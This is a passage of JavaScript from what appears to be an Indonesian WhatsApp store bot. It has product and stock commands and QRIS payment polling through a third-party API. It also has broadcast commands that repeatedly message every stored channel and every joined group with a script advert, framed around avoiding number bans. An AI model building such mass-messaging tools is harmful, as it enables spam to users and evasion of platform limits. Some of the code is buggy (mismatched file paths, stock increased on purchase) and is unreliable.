    m.reply('❌ Terjadi kesalahan saat memeriksa produk.');
  }
}
break;

case 'delstock': {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply('❌ Masukkan kode barang yang ingin dihapus.');

  try {
    // Baca file JSON
    let daftarBarang = JSON.parse(fs.readFileSync('./library/database/databarang.json', 'utf8'));

    // Cek apakah kode barang ada dalam daftar
    if (!daftarBarang.some(item => item.kodebarang === text)) {
      return m.reply('❌ Kode barang tidak ditemukan dalam daftar.');
    }

    // Hapus barang berdasarkan kodebarang
    daftarBarang = daftarBarang.filter(item => item.kodebarang !== text);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./library/database/databarang.json', JSON.stringify(daftarBarang, null, 2));
    m.reply(`✅ Barang dengan kode ${text} berhasil dihapus.`);
  } catch (error) {
    console.error("Error saat menghapus barang:", error);
    m.reply('❌ Terjadi kesalahan saat menghapus barang.');
  }
}
break;

case 'delproduk': {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply('❌ Masukkan kode produk yang ingin dihapus.');

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./library/database/dataproduk.json', 'utf8'));

    // Cek apakah kode produk ada dalam daftar
    if (!daftarProduk.some(item => item.kodeproduk === text)) {
      return m.reply('❌ Kode produk tidak ditemukan dalam daftar.');
    }

    // Hapus produk berdasarkan kodeproduk
    daftarProduk = daftarProduk.filter(item => item.kodeproduk !== text);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./library/database/dataproduk.json', JSON.stringify(daftarProduk, null, 2));
    m.reply(`✅ Produk dengan kode ${text} berhasil dihapus.`);
  } catch (error) {
    console.error("Error saat menghapus produk:", error);
    m.reply('❌ Terjadi kesalahan saat menghapus produk.');
  }
}
break;

;

case 'listproduk': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./library/database/dataproduk.json', 'utf8'));

    if (daftarProduk.length === 0) {
      return m.reply('❌ Tidak ada produk yang terdaftar.');
    }

    // Susun daftar produk
    let teks = '📋 *Daftar Produk:*\n\n';
    let buttonRows = []; // Array untuk tombol pemilihan produk

    daftarProduk.forEach((item, i) => {
      teks += `🆔 ${i + 1}. *Kode:* ${item.kodeproduk}\n   🏷️ *Nama:* ${item.namaproduk}\n   💰 *Harga:* ${item.hargaproduk}\n   📄 *Deskripsi:* ${item.deskripsiproduk}\n\n`;

      // Tambahkan item ke dalam tombol pemilihan
      buttonRows.push({
        title: `${item.namaproduk} - ${item.hargaproduk}`,
        id: `.buyproduk ${item.kodeproduk}`
      });
    });

    teks += 'ℹ️ *Cara Membeli:*\n' +
            'Silakan pilih produk yang tersedia dari daftar di bawah atau gunakan perintah manual:\n' +
            '🛒 _*.buyproduk [kodeproduk]*_\n\n' +
            'Contoh: _*.buyproduk ABC123*_\n\n' +
            'Pastikan kode produk sesuai dengan daftar di atas. ✅';

    // Kirim daftar produk dan tombol pemilihan
    await conn.sendMessage(m.chat, {
      footer: `© 2025 ${botname}`,
      buttons: [
        {
          buttonId: 'action',
          buttonText: { displayText: 'Pilih Produk untuk Dibeli' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: 'Pilih Produk yang Tersedia',
              sections: [{ title: 'Produk Tersedia', rows: buttonRows }]
            })
          }
        }
      ],
      headerType: 1,
      viewOnce: true,
      image: { url: global.image.reply },
      caption: teks + "\n\n```Atau Bisa Memilih Langsung Dibawah Ini.```\n"
    }, { quoted: m });

  } catch (error) {
    console.error("❌ Error saat membaca daftar produk:", error);
    m.reply('⚠️ Terjadi kesalahan saat membaca daftar produk.');
  }
}
break;

case 'editstockdo':  
case 'editstockdigitalocean': {  
  if (!isCreator) return m.reply(mess.owner);  
  let input = text.split('|');  

  if (input.length < 5) {  
    return m.reply('❌ Masukkan data barang dengan format: kodebarang|namabarang|hargabarang|stockbarang|dropletbarang');  
  }  

  let [kodebarang, namabarang, hargabarang, stockbarang, dropletbarang] = input;  

  // Pastikan harga dan stok adalah angka  
  hargabarang = parseFloat(hargabarang);  
  stockbarang = parseInt(stockbarang);  

  if (isNaN(hargabarang) || isNaN(stockbarang)) {  
    return m.reply('❌ Harga dan stok harus berupa angka.');  
  }  

  try {  
    // Baca file JSON  
    let daftarBarang = JSON.parse(fs.readFileSync('./library/database/datado.json', 'utf8'));  

    // Cari barang berdasarkan kode  
    let index = daftarBarang.findIndex(item => item.kodebarang === kodebarang);  

    if (index === -1) {  
      return m.reply('❌ Kode barang tidak ditemukan dalam daftar.');  
    }  

    // Update data barang  
    daftarBarang[index] = {  
      kodebarang,  
      namabarang,  
      hargabarang,  
      stockbarang,  
      dropletbarang  
    };  

    // Simpan kembali ke file JSON  
    fs.writeFileSync('./library/database/datado.json', JSON.stringify(daftarBarang, null, 2));  
    m.reply(`✅ Barang berhasil diperbarui:\nKode: ${kodebarang}\nNama: ${namabarang}\nHarga: ${hargabarang}\nStok: ${stockbarang}\nDroplet: ${dropletbarang}`);  
  } catch (error) {  
    console.error("Error saat mengedit barang:", error);  
    m.reply('❌ Terjadi kesalahan saat mengedit barang.');  
  }  
}  
break;

case 'editstock': {
  if (!isCreator) return m.reply(mess.owner);
  let input = text.split('|');

  if (input.length < 4) {
    return m.reply('❌ Masukkan data barang dengan format: kodebarang|namabarang|hargabarang|stockbarang');
  }

  let [kodebarang, namabarang, hargabarang, stockbarang] = input;

  // Pastikan harga dan stok adalah angka
  hargabarang = parseFloat(hargabarang);
  stockbarang = parseInt(stockbarang);

  if (isNaN(hargabarang) || isNaN(stockbarang)) {
    return m.reply('❌ Harga dan stok harus berupa angka.');
  }

  try {
    // Baca file JSON
    let daftarBarang = JSON.parse(fs.readFileSync('./library/database/databarang.json', 'utf8'));

    // Cek apakah kode barang ada dalam daftar
    let barangIndex = daftarBarang.findIndex(item => item.kodebarang === kodebarang);
    if (barangIndex === -1) {
      return m.reply('❌ Kode barang tidak ditemukan dalam daftar.');
    }

    // Update data barang
    daftarBarang[barangIndex] = {
      kodebarang,
      namabarang,
      hargabarang,
      stockbarang
    };

    // Simpan kembali ke file JSON
    fs.writeFileSync('./library/database/databarang.json', JSON.stringify(daftarBarang, null, 2));
    m.reply(`✅ Barang berhasil diperbarui:\nKode: ${kodebarang}\nNama: ${namabarang}\nHarga: ${hargabarang}\nStok: ${stockbarang}`);
  } catch (error) {
    console.error("Error saat mengedit barang:", error);
    m.reply('❌ Terjadi kesalahan saat mengedit barang.');
  }
}
break;

case 'editproduk': {
  if (!isCreator) return m.reply(mess.owner);
  let input = text.split('|');

  if (input.length < 4) {
    return m.reply('❌ Masukkan data produk dengan format: kodeproduk|namaproduk|hargaproduk|deskripsiproduk');
  }

  let [kodeproduk, namaproduk, hargaproduk, deskripsiproduk] = input;

  // Pastikan harga adalah angka
  hargaproduk = parseFloat(hargaproduk);

  if (isNaN(hargaproduk)) {
    return m.reply('❌ Harga harus berupa angka.');
  }

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./library/database/dataproduk.json', 'utf8'));

    // Cek apakah kode produk ada dalam daftar
    let produkIndex = daftarProduk.findIndex(item => item.kodeproduk === kodeproduk);
    if (produkIndex === -1) {
      return m.reply('❌ Kode produk tidak ditemukan dalam daftar.');
    }

    // Update data produk
    daftarProduk[produkIndex] = {
      kodeproduk,
      namaproduk,
      hargaproduk,
      deskripsiproduk
    };

    // Simpan kembali ke file JSON
    fs.writeFileSync('./library/database/dataproduk.json', JSON.stringify(daftarProduk, null, 2));
    m.reply(`✅ Produk berhasil diperbarui:\nKode: ${kodeproduk}\nNama: ${namaproduk}\nHarga: ${hargaproduk}\nDeskripsi: ${deskripsiproduk}`);
  } catch (error) {
    console.error("Error saat mengedit produk:", error);
    m.reply('❌ Terjadi kesalahan saat mengedit produk.');
  }
}
break;

case 'buystock': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
  if (m.isGroup) return m.reply("Pembelian stok hanya bisa dilakukan dalam private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  let kodebarang = text.trim();
  if (!kodebarang) return m.reply('❌ Masukkan kode barang yang ingin dibeli.');

  try {
    // Baca file JSON
    let daftarBarang = JSON.parse(fs.readFileSync('./library/database/databarang.json', 'utf8'));

    // Cari barang berdasarkan kodebarang
    let barang = daftarBarang.find(item => item.kodebarang === kodebarang);
    if (!barang) return m.reply('❌ Kode barang tidak ditemukan dalam daftar.');

    // Proses pembayaran melalui API Order Kuota
    let hargaBarang = parseInt(barang.hargabarang);
    let uniqueAmount = hargaBarang + generateRandomNumber(110, 250);
    let getPayment = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${uniqueAmount}&codeqr=${global.qrisOrderKuota}`);

    let paymentInfo = getPayment.data.result;
    let teksPembayaran = `
*📌 INFORMASI PEMBAYARAN*

*• ID Transaksi:* ${paymentInfo.transactionId}
*• Total Pembayaran:* Rp${await toIDR(paymentInfo.amount)}
*• Barang:* ${barang.namabarang}
*• Kode Barang:* ${barang.kodebarang}
*• Expired:* 5 menit

⚠️ *Note:*  
- Qris pembayaran hanya berlaku dalam 5 menit.  
- Jika melewati batas waktu, pembayaran dianggap tidak valid!  
- Jika pembayaran berhasil, bot akan mengirim notifikasi status transaksi.

Ketik *.batalbeli* untuk membatalkan pembelian.
`;

    let msgQr = await conn.sendMessage(m.chat, {
      footer: `© 2025 ${botname}`,
      buttons: [{ buttonId: `.batalbeli`, buttonText: { displayText: 'Batalkan Pembelian' }, type: 1 }],
      headerType: 1,
      viewOnce: true,
      image: { url: paymentInfo.qrImageUrl },
      caption: teksPembayaran,
      contextInfo: { mentionedJid: [m.sender] },
    });

    // Simpan status transaksi ke database
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].pembelian = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: paymentInfo.transactionId,
      amount: paymentInfo.amount.toString(),
      kodebarang: barang.kodebarang,
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit) {
            await conn.sendMessage(db.users[m.sender].pembelian.chat, { text: "⚠️ Qris pembayaran telah expired!" }, { quoted: db.users[m.sender].pembelian.msg });
            await conn.sendMessage(db.users[m.sender].pembelian.chat, { delete: db.users[m.sender].pembelian.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].pembelian;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].pembelian.exp();

    // Cek pembayaran secara berkala
    while (db.users[m.sender].status_deposit) {
      await sleep(8000);
      let resultCek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
      let req = resultCek.data;

      if (req?.amount == db.users[m.sender].pembelian.amount) {
        db.users[m.sender].status_deposit = false;
        delete db.users[m.sender].pembelian;

        // Tambahkan stok barang yang dibeli
        let barangIndex = daftarBarang.findIndex(item => item.kodebarang === kodebarang);
        daftarBarang[barangIndex].stockbarang += 1; // Tambah stok
        fs.writeFileSync('./library/database/databarang.json', JSON.stringify(daftarBarang, null, 2));

        await conn.sendMessage(m.sender, { text: `
✅ *PEMBAYARAN BERHASIL!*

*• ID Transaksi:* ${paymentInfo.transactionId}
*• Total Pembayaran:* Rp${await toIDR(req.amount)}
*• Barang:* ${barang.namabarang}
*• Kode Barang:* ${barang.kodebarang}
*• Stok Sekarang:* ${daftarBarang[barangIndex].stockbarang}
`});
      }
    }
  } catch (error) {
    console.error("Error saat memproses pembelian:", error);
    m.reply('❌ Terjadi kesalahan saat memproses pembelian.');
  }
}
break;

case 'buystockdo':  
case 'buystockdigitalocean': {  
  if (m.isGroup) return m.reply("Pembelian stok hanya bisa dilakukan dalam private chat.");  
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");  

  let kodebarang = text.trim();  
  if (!kodebarang) return m.reply('❌ Masukkan kode barang yang ingin dibeli.');  

  try {  
    // Baca file JSON  
    let daftarBarang = JSON.parse(fs.readFileSync('./library/database/datado.json', 'utf8'));  

    // Cari barang berdasarkan kodebarang  
    let barang = daftarBarang.find(item => item.kodebarang === kodebarang);  
    if (!barang) return m.reply('❌ Kode barang tidak ditemukan dalam daftar.');  

    // Proses pembayaran melalui API Order Kuota  
    let hargaBarang = parseInt(barang.hargabarang);  
    let uniqueAmount = hargaBarang + generateRandomNumber(110, 250);  
    let getPayment = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${uniqueAmount}&codeqr=${global.qrisOrderKuota}`);  

    let paymentInfo = getPayment.data.result;  
    let teksPembayaran = `  
*📌 INFORMASI PEMBAYARAN*  

*• ID Transaksi:* ${paymentInfo.transactionId}  
*• Total Pembayaran:* Rp${await toIDR(paymentInfo.amount)}  
*• Barang:* ${barang.namabarang}  
*• Kode Barang:* ${barang.kodebarang}  
*• Droplet:* ${barang.dropletbarang}  
*• Expired:* 5 menit  

⚠️ *Note:*  
- Qris pembayaran hanya berlaku dalam 5 menit.  
- Jika melewati batas waktu, pembayaran dianggap tidak valid!  
- Jika pembayaran berhasil, bot akan mengirim notifikasi status transaksi.  

Ketik *.batalbeli* untuk membatalkan pembelian.  
`;  

    let msgQr = await conn.sendMessage(m.chat, {  
      footer: `© 2025 ${botname}`,  
      buttons: [{ buttonId: `.batalbeli`, buttonText: { displayText: 'Batalkan Pembelian' }, type: 1 }],  
      headerType: 1,  
      viewOnce: true,  
      image: { url: paymentInfo.qrImageUrl },  
      caption: teksPembayaran,  
      contextInfo: { mentionedJid: [m.sender] },  
    });  

    // Simpan status transaksi ke database  
    db.users[m.sender].status_deposit = true;  
    db.users[m.sender].pembelian = {  
      msg: msgQr,  
      chat: m.sender,  
      idDeposit: paymentInfo.transactionId,  
      amount: paymentInfo.amount.toString(),  
      kodebarang: barang.kodebarang,  
      exp: function () {  
        setTimeout(async () => {  
          if (db.users[m.sender].status_deposit) {  
            await conn.sendMessage(db.users[m.sender].pembelian.chat, { text: "⚠️ Qris pembayaran telah expired!" }, { quoted: db.users[m.sender].pembelian.msg });  
            await conn.sendMessage(db.users[m.sender].pembelian.chat, { delete: db.users[m.sender].pembelian.msg.key });  
            db.users[m.sender].status_deposit = false;  
            delete db.users[m.sender].pembelian;  
          }  
        }, 300000); // 5 menit  
      }  
    };  

    await db.users[m.sender].pembelian.exp();  

    // Cek pembayaran secara berkala  
    while (db.users[m.sender].status_deposit) {  
      await sleep(8000);  
      let resultCek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);  
      let req = resultCek.data;  

      if (req?.amount == db.users[m.sender].pembelian.amount) {  
        db.users[m.sender].status_deposit = false;  
        delete db.users[m.sender].pembelian;  

        // Kurangi stok barang yang dibeli  
        let barangIndex = daftarBarang.findIndex(item => item.kodebarang === kodebarang);  
        if (daftarBarang[barangIndex].stockbarang > 0) {  
          daftarBarang[barangIndex].stockbarang -= 1; // Kurangi stok  
          fs.writeFileSync('./library/database/datado.json', JSON.stringify(daftarBarang, null, 2));  
        }  

        await conn.sendMessage(m.sender, { text: `  
✅ *PEMBAYARAN BERHASIL!*  

*• ID Transaksi:* ${paymentInfo.transactionId}  
*• Total Pembayaran:* Rp${await toIDR(req.amount)}  
*• Barang:* ${barang.namabarang}  
*• Kode Barang:* ${barang.kodebarang}  
*• Droplet:* ${barang.dropletbarang}  
*• Stok Sekarang:* ${daftarBarang[barangIndex].stockbarang}  
`});  
      }  
    }  
  } catch (error) {  
    console.error("Error saat memproses pembelian:", error);  
    m.reply('❌ Terjadi kesalahan saat memproses pembelian.');  
  }  
}  
break;

case 'buyproduk': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
  if (m.isGroup) return m.reply("Pembelian produk hanya bisa dilakukan dalam private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  let kodeproduk = text.trim();
  if (!kodeproduk) return m.reply('❌ Masukkan kode produk yang ingin dibeli.');

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./library/database/dataproduk.json', 'utf8'));

    // Cari produk berdasarkan kodeproduk
    let produk = daftarProduk.find(item => item.kodeproduk === kodeproduk);
    if (!produk) return m.reply('❌ Kode produk tidak ditemukan dalam daftar.');

    // Proses pembayaran melalui API Order Kuota
    let hargaProduk = parseInt(produk.hargaproduk);
    let uniqueAmount = hargaProduk + generateRandomNumber(110, 250);
    let getPayment = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${uniqueAmount}&codeqr=${global.qrisOrderKuota}`);

    let paymentInfo = getPayment.data.result;
    let teksPembayaran = `
*📌 INFORMASI PEMBAYARAN*

*• ID Transaksi:* ${paymentInfo.transactionId}
*• Total Pembayaran:* Rp${await toIDR(paymentInfo.amount)}
*• Produk:* ${produk.namaproduk}
*• Kode Produk:* ${produk.kodeproduk}
*• Expired:* 5 menit

⚠️ *Note:*  
- Qris pembayaran hanya berlaku dalam 5 menit.  
- Jika melewati batas waktu, pembayaran dianggap tidak valid!  
- Jika pembayaran berhasil, bot akan mengirim notifikasi status transaksi.

Ketik *.batalbeli* untuk membatalkan pembelian.
`;

    let msgQr = await conn.sendMessage(m.chat, {
      footer: `© 2025 ${botname}`,
      buttons: [{ buttonId: `.batalbeli`, buttonText: { displayText: 'Batalkan Pembelian' }, type: 1 }],
      headerType: 1,
      viewOnce: true,
      image: { url: paymentInfo.qrImageUrl },
      caption: teksPembayaran,
      contextInfo: { mentionedJid: [m.sender] },
    });

    // Simpan status transaksi ke database
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].pembelian = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: paymentInfo.transactionId,
      amount: paymentInfo.amount.toString(),
      kodeproduk: produk.kodeproduk,
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit) {
            await conn.sendMessage(db.users[m.sender].pembelian.chat, { text: "⚠️ Qris pembayaran telah expired!" }, { quoted: db.users[m.sender].pembelian.msg });
            await conn.sendMessage(db.users[m.sender].pembelian.chat, { delete: db.users[m.sender].pembelian.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].pembelian;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].pembelian.exp();

    // Cek pembayaran secara berkala
    while (db.users[m.sender].status_deposit) {
      await sleep(8000);
      let resultCek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
      let req = resultCek.data;

      if (req?.amount == db.users[m.sender].pembelian.amount) {
        db.users[m.sender].status_deposit = false;
        delete db.users[m.sender].pembelian;

        await conn.sendMessage(m.sender, { text: `
✅ *PEMBAYARAN BERHASIL!*

*• ID Transaksi:* ${paymentInfo.transactionId}
*• Total Pembayaran:* Rp${await toIDR(req.amount)}
*• Produk:* ${produk.namaproduk}
*• Kode Produk:* ${produk.kodeproduk}
`});
      }
    }
  } catch (error) {
    console.error("Error saat memproses pembelian:", error);
    m.reply('❌ Terjadi kesalahan saat memproses pembelian.');
  }
}
break;

case 'addid': {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply('❌ Masukkan ID saluran yang ingin ditambahkan.');

  try {
    // Baca file JSON
    let daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));

    // Cek apakah ID sudah ada
    if (daftarSaluran.includes(text)) {
      return m.reply('❌ ID saluran sudah ada dalam daftar.');
    }

    // Tambahkan ID baru
    daftarSaluran.push(text);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./library/database/idsaluran.json', JSON.stringify(daftarSaluran, null, 2));
    m.reply(`✅ ID saluran berhasil ditambahkan: ${text}`);
  } catch (error) {
    console.error("Error saat menambahkan ID:", error);
    m.reply('❌ Terjadi kesalahan saat menambahkan ID.');
  }
  }
  break;

case 'addallid': {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply('❌ Masukkan satu atau lebih ID saluran yang ingin ditambahkan (pisahkan dengan spasi atau koma).');

  try {
    // Baca file JSON
    let daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));

    // Pisahkan input menjadi array (bisa dipisahkan dengan spasi atau koma)
    let idBaru = text.split(/[\s,]+/).filter(id => id.trim() !== "");

    // Filter ID yang belum ada dalam daftar
    let idBerhasilDitambahkan = [];
    let idSudahAda = [];

    idBaru.forEach(id => {
      if (daftarSaluran.includes(id)) {
        idSudahAda.push(id);
      } else {
        daftarSaluran.push(id);
        idBerhasilDitambahkan.push(id);
      }
    });

    // Simpan kembali ke file JSON jika ada ID baru yang ditambahkan
    if (idBerhasilDitambahkan.length > 0) {
      fs.writeFileSync('./library/database/idsaluran.json', JSON.stringify(daftarSaluran, null, 2));
    }

    // Kirim respons
    let pesan = '✅ Hasil Penambahan ID:\n';
    if (idBerhasilDitambahkan.length > 0) {
      pesan += `- ID baru ditambahkan: ${idBerhasilDitambahkan.join(', ')}\n`;
    }
    if (idSudahAda.length > 0) {
      pesan += `- ID sudah ada dalam daftar: ${idSudahAda.join(', ')}`;
    }
    
    m.reply(pesan.trim());
  } catch (error) {
    console.error("Error saat menambahkan ID:", error);
    m.reply('❌ Terjadi kesalahan saat menambahkan ID.');
  }
  break;
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delid': {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply('❌ Masukkan ID saluran yang ingin dihapus.');

  try {
    // Baca file JSON
    let daftarSaluran = JSON.parse(fs.readFileSync('./database/idsaluran.json', 'utf8'));

    // Cek apakah ID ada dalam daftar
    if (!daftarSaluran.includes(text)) {
      return m.reply('❌ ID saluran tidak ditemukan dalam daftar.');
    }

    // Hapus ID
    daftarSaluran = daftarSaluran.filter(id => id !== text);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./library/database/idsaluran.json', JSON.stringify(daftarSaluran, null, 2));
    m.reply(`✅ ID saluran berhasil dihapus: ${text}`);
  } catch (error) {
    console.error("Error saat menghapus ID:", error);
    m.reply('❌ Terjadi kesalahan saat menghapus ID.');
  }
  }
  break;

case 'resetid': {
  if (!isCreator) return m.reply(mess.owner);

  try {
    // Reset file JSON dengan array kosong
    fs.writeFileSync('./library/database/idsaluran.json', JSON.stringify([], null, 2));
    
    m.reply('✅ Semua ID saluran telah dihapus.');
  } catch (error) {
    console.error("Error saat mereset ID:", error);
    m.reply('❌ Terjadi kesalahan saat menghapus semua ID.');
  }
  break;
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listid': {
  if (!isCreator) return m.reply(mess.owner);

  try {
    // Baca file JSON
    let daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));

    if (daftarSaluran.length === 0) {
      return m.reply('❌ Tidak ada ID saluran yang terdaftar.');
    }

    // Kirim daftar ID
    let teks = '📋 *Daftar ID Saluran:*\n\n';
    daftarSaluran.forEach((id, i) => {
      teks += `${i + 1}. ${id}\n`;
    });
    m.reply(teks);
  } catch (error) {
    console.error("Error saat membaca daftar ID:", error);
    m.reply('❌ Terjadi kesalahan saat membaca daftar ID.');
  }
  }
  break;


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'jpmch': {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply("Teksnya?"); // Periksa apakah teks tersedia

  // Memuat daftar saluran dari file JSON
  const fs = require('fs');
  let daftarSaluran;
  try {
    daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); // Baca file JSON
  } catch (error) {
    console.error("Gagal membaca file idsaluran.json:", error);
    return Reply("❌ Gagal membaca daftar saluran.");
  }

  // Beri tahu pengguna bahwa proses sedang berlangsung
  Reply("⏳ Harap sabar, proses sedang berlangsung, jeda 5 menit mrnghindari kenon nomor anda...");

  // Kirim pesan ke semua saluran dalam daftar
  for (const idSaluran of daftarSaluran) {
    try {
      await conn.sendMessage(idSaluran, { text: text }); // Mengirim pesan ke saluran
    } catch (error) {
      console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
    }
  }
  
  Reply("✅ Berhasil mengirim pesan ke semua channel WhatsApp.");
}
break;

case 'jpmchrelay': { 
    if (!isCreator) return m.reply(mess.owner); 
    if (!text) return m.reply("Teksnya?"); // Periksa apakah teks tersedia

    // Import modul filesystem
    const fs = require('fs'); 

    // Memuat daftar saluran dari file JSON
    let daftarSaluran; 
    try { 
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); 
    } catch (error) { 
        console.error("Gagal membaca file idsaluran.json:", error); 
        return m.reply("❌ Gagal membaca daftar saluran."); 
    }

    // Konfigurasi jumlah putaran dan delay
    const jumlahPutaran = 2; // Ganti dengan jumlah putaran yang diinginkan
    const delayPerPesan = 2000; // Delay dalam milidetik (2000 ms = 2 detik)

    // Fungsi untuk menunggu delay
    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    // Mengirim pesan ke semua saluran dalam daftar dengan putaran
    const kirimPesan = async () => {
        for (let putaran = 0; putaran < jumlahPutaran; putaran++) {
            for (const idSaluran of daftarSaluran) {
                try { 
                    await conn.sendMessage(idSaluran, { text: text }); 
                    console.log(`✅ Berhasil mengirim ke ${idSaluran} (Putaran ${putaran + 1})`);
                } catch (error) { 
                    console.error(`❌ Gagal mengirim ke ${idSaluran}:`, error); 
                }
                await delay(delayPerPesan); // Menunggu sebelum mengirim ke saluran berikutnya
            }
        }
        m.reply(`✅ Selesai mengirim pesan ke semua channel WhatsApp dalam ${jumlahPutaran} putaran.`);
    };

    kirimPesan(); // Memulai proses pengiriman pesan
    }
    break; 

case 'jpmch2': {
  if (!isCreator) return m.reply(mess.owner);
  
  let [jumlah, ...pesanArray] = text.split('|');
  let pesan = pesanArray.join('|').trim();
  jumlah = parseInt(jumlah.trim());

  if (isNaN(jumlah) || jumlah <= 0) return m.reply("❌ Masukkan jumlah pesan yang valid di awal teks! Contoh: 3| Halo semua!");

  // Memuat daftar saluran dari file JSON
  const fs = require('fs');
  let daftarSaluran;
  
  try {
    daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));
    if (!Array.isArray(daftarSaluran) || daftarSaluran.length === 0) {
      return m.reply("❌ Tidak ada saluran yang terdaftar.");
    }
  } catch (error) {
    console.error("Gagal membaca file idsaluran.json:", error);
    return m.reply("❌ Gagal membaca daftar saluran.");
  }

  // Kirim pesan ke semua saluran dalam daftar sesuai jumlah yang ditentukan
  for (const idSaluran of daftarSaluran) {
    for (let i = 0; i < jumlah; i++) {
      try {
        await conn.sendMessage(idSaluran, { text: pesan });
      } catch (error) {
        console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error);
      }
    }
  }

  m.reply(`✅ Berhasil mengirim pesan ke semua channel sebanyak ${jumlah} kali.`);
  }
  break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'pmscaan': {
 if (!isCreator) return Reply(mess.owner);

    const allgrup = await conn.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    let suksesGrup = []; // Array untuk menyimpan grup yang berhasil
    let gagalGrup = []; // Array untuk menyimpan grup yang gagal

    const teks = `*_Sell Script_* *_AanzCuyxzzz-V5_*
*_Harga Asli 40K_*
*_Harga Diskon Baru Rilis 35K_*

*_#Keunggulan Script 🔥_*
- *_Support Saluran_*
- *_Buy Otomatis_*
- *_Buy Followers/Like/View_*
- *_Topup Game_*
- *_Topup Ewallet_*
- *_Topup Token Listrik_*
- *_Topup Pulsa_*
- *_Buy Domain_*
- *_Buy Nokos_*
- *_Buy Jasa Install Tema_*
- *_Buy Jasa Install Panel_*
- *_Buy Panel/Adp/Reseller_*
- *_Cpanel 3 Server_*
- *_Jpm Text/Foto Ch_*
- *_Add Id Ch_*
- *_Button New_*
- *_Tanyakan Fitur Lain Ke Pm_*
*Semua Fitur Buy Memakai Integrasi Order Kuota Kecuali Buy Followers/Like/View_*
*_Full Cara Setting Api Nya📢_*

*_Keamanan Script Menggunakan Database Github Berupa Nomor , Username , Dan Key_*
> *_Jadi 1 Nomer Berbeda Beda Key_*

*_Buy Script Hubungi_*
*_Wa.me/62858425088642_*
*_T.me/Reaps_*
> *_Rapszio Real Reseller Sc Aanz_*`;

    const jid = m.chat;
    const gambarDefault = "./source/media/script.jpg";

